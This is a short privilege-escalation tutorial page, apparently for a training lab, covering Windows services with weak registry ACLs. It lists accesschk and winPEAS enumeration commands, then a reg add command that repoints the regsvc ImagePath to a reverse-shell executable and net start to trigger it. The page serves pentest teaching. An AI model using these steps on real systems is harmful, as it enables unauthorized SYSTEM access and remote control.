# Weak Registry Permissions

The Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service’s configuration even if we cannot modify the service directly.

```
accesschk.exe -accepteula -wuvc "Everyone" *
accesschk.exe -accepteula -wuvc "Users" *
accesschk.exe -accepteula -wuvc "Authenticated Users" *
```

Run winPEAS to check for service misconfigurations:

```
winPEASany.exe quiet servicesinfo
```

![](<../../../../.gitbook/assets/image (76).png>)

Note that the “regsvc” service has a weak registry entry. We can confirm this with PowerShell:

```
Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
```

![](<../../../../.gitbook/assets/image (87) (1).png>)

Alternatively accesschk.exe can be used to confirm:

```
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

![](<../../../../.gitbook/assets/image (94) (1).png>)

verify that we can start the service:

```
accesschk.exe /accepteula -ucqv user regsvc
```

![](<../../../../.gitbook/assets/image (104) (1).png>)

now lets check the current value of the service registry entry:

```
reg query HKLM\System\CurrentControlSet\Services\regsvc
```

![](<../../../../.gitbook/assets/image (99).png>)

Overwrite the ImagePath registry key to point to our reverse shell executable:

```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

![](<../../../../.gitbook/assets/image (73).png>)

Start a listener on Kali, and then start the service to trigger the exploit:

```
 net start regsvc
```

![](<../../../../.gitbook/assets/image (95).png>)
